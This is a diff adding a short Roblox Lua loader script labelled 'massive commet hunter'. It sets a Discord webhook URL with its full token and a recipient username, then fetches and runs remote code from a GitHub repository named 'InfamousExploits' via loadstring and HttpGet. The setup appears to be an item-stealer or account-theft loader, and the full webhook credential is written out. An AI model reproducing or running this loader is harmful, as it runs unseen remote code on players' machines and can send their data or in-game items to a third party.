@@ -1,0 +1,9 @@
+_G.Webhook = "https://discord.com/api/webhooks/1102025770622255145/ciuDNSlpyjdYgpKZrzD0pJl02l_Lxyf--B9uId85tRQQq8rd8qbFki7ggBID-GGQlJEe"
+
+_G.Username = "coupFatalcoup2"
+
+_G.ScriptName = "massive commet hunter"
+
+ 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/InfamousExploits/InfamousOnTop/main/New.lua", true))()
